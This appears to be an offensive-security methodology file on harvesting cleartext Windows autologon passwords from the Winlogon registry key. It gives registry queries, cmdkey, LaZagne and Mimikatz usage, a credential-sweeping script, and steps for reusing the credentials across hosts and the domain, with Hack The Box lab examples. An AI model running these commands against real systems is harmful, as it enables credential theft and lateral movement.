# Winlogon Autologon Credential

> Windows kiosk-mode / single-purpose hosts often store an
> `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`
> autologon entry containing a *cleartext* password.

## Objective
Recover plaintext credentials configured for autologon from any
Windows shell.

## When To Use
On any non-domain-controller Windows shell, especially:
- Service-purpose boxes (kiosks, bank teller workstations, lab PCs).
- Boxes where a service account is logged in interactively.
- WinPEAS flags the `Winlogon` registry as containing a default
  password.

## Detection Indicators

WinPEAS / LaZagne flags the entry. Manual:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# look for non-empty:
#   DefaultUserName
#   DefaultDomainName
#   DefaultPassword
#   AutoAdminLogon = 1
```

## Enumeration Strategy

Single registry query covers it:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
  | findstr /i "default autoadmin"
```

Or via PowerShell:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
  | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
```

## Exploitation Workflow

1. Query the registry.
2. If `DefaultPassword` is non-empty, it's plaintext.
3. Note the `DefaultDomainName` (could be `.` for local, or the AD
   domain).
4. Use the cred for downstream auth (WinRM, SMB, BloodHound, DCSync if
   the account has rights).

```powershell
# Sauna example
DefaultUserName    : EGOTISTICAL-BANK\svc_loanmanager
DefaultPassword    : Moneymakestheworldgoround!
AutoAdminLogon     : 1
```

## Commands

```powershell
# query all relevant fields
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>$null
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName 2>$null
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon 2>$null

# also check legacy / 32-bit view
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null

# also: Net Logon's saved creds
cmdkey /list
```

## Tool Usage

- **WinPEAS** — `Quick` and `Default` modes flag this immediately.
- **LaZagne** — `lazagne all` includes Winlogon.
- **Mimikatz** — `lsadump::secrets` includes the LSA secret form
  (`DPAPI` / encrypted) which sometimes contains Winlogon
  passwords too.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Looking only at HKCU | Miss it (it's HKLM) | Always check HKLM |
| Forgetting Wow6432Node | Miss 32-bit-installed setups | Check both views |
| Username typo in registry | Cred works for actual account name | Confirm via `net user` |
| Treating it as local-only | Often domain user | Try `<DOMAIN>\<user>` everywhere |

## Decision-Making Logic

```
shell on Windows? → reg query Winlogon → DefaultPassword present?
  Yes → use cred for:
        - WinRM into this box (if not already)
        - LDAP / BloodHound (if domain user)
        - Sweep across other hosts (CME)
  No → next privesc family (cmdkey /list, sysprep files, etc.)
```

## Pivot Opportunities

When the autologon user is a domain account, BloodHound them
immediately. Frequently it's a service account with elevated rights
(Sauna's `svc_loanmgr` had DCSync).

## OPSEC Considerations
- Reading the registry is benign; minimal forensic footprint.
- Using the cred for SMB / WinRM is loud at the destination.

## Real HTB Examples

- **Sauna** — autologon entry → `svc_loanmgr` → DCSync.
- **Resolute** — different store (PowerShell history) but same
  "credentials in default place" class.
- **Cascade** — LDAP custom attribute is the analogue.
- **Bastion** — VHD backup is the analogue (different mechanism).

## Alternative Techniques

- **`cmdkey /list`** — saved credentials cache.
- **`runas /savecred` history** — cached on disk (DPAPI-encrypted).
- **Browser-stored passwords** — DPAPI-decryptable from same user
  context.
- **PowerShell history** — `ConsoleHost_history.txt` (Resolute).

## Automation Opportunities

```powershell
# everything-in-one credential check
$paths = @(
  "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
  "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"
)
foreach ($p in $paths) {
  if (Test-Path $p) {
    Get-ItemProperty $p | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
  }
}
```

## Checklist

- [ ] `reg query` HKLM Winlogon
- [ ] Check Wow6432Node variant
- [ ] `cmdkey /list`
- [ ] Use found cred against domain (BloodHound, CME)
- [ ] Use found cred against same user on this box and others

## Related Skills

- [`windows-privesc/credential-store-mining.md`](credential-store-mining.md)
- [`windows-privesc/powershell-history.md`](powershell-history.md)
- [`tool-usage/winpeas.md`](../tool-usage/winpeas.md)
- [`methodology/09-credential-hunting.md`](../methodology/09-credential-hunting.md)
